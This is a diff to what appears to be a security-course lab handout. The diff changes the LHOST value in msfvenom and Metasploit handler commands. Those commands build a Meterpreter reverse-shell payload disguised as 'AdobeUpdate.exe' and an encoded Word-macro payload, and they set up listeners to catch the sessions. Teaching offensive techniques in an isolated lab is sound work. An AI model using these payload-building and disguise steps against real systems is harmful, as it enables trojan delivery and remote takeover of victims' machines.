@@ -46,14 +46,14 @@ To start, log in to Kali, and start up the Windows virtual machine.
 5.    In Kali, run the following command, all on one line:
 
       ```bash
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST=infosec-net -f exe > /tmp/AdobeUpdate.exe
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=infosec0 -f exe > /tmp/AdobeUpdate.exe
       ```
 
       Where:
 
       * `-p` -- selects the payload to be the same one we used during the exploitation lab -- `meterpreter`.
       * `-f exe` -- selects the file type of the output executable
-      * `LHOST=infosec-net` -- resolves to Kali's `192.168.56.0/24` address on the lab network. (`infosec0`, the interface name, and the explicit `192.168.56.101` work too.)
+      * `LHOST=infosec0` -- the lab-network interface name; `msfvenom` resolves it to Kali's `192.168.56.101` address. (The explicit `192.168.56.101` works too. Do **not** use the hostname `infosec-net` here -- `msfvenom` rejects it, even though msfconsole accepts it.)
       * `> /tmp/AdobeUpdate.exe` -- redirects the output from running the `msfvenom` command into a file called `AdobeUpdate.exe`, stored in the `/tmp` directory.
 
         <div class='alert alert-info'>This is not actually an Adobe Update! This is our payload, <em>disguised</em>.</div>
@@ -71,7 +71,7 @@ To start, log in to Kali, and start up the Windows virtual machine.
             outside of the framework.” A stub adds additional functionality to
             other exploits.
       12.   Enter `set PAYLOAD windows/meterpreter/reverse_tcp`.
-      13.   Enter `set LHOST infosec-net`.
+      13.   Enter `set LHOST infosec0`.
       15.   Enter `exploit -j`.
 
             <div class='alert alert-info'>
@@ -361,7 +361,7 @@ portion of this lab.
 
 1.   In Kali, run the following command (all one line):
 
-          msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=infosec-net LPORT=7777 -e x86/shikata_ga_nai -f vba-exe > word-macro-exploit
+          msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=infosec0 LPORT=7777 -e x86/shikata_ga_nai -f vba-exe > word-macro-exploit
 
      This will save the exploit to a file called `word-macro-exploit`
 2.   Open `word-macro-exploit` using `mousepad`, and read the beginning of the output. It explains that the output is
@@ -378,7 +378,7 @@ portion of this lab.
           use exploit/multi/handler
           set payload windows/meterpreter/reverse_tcp
           set LPORT 7777
-          set LHOST infosec-net
+          set LHOST infosec0
           set ExitOnSession false
           exploit -j
 
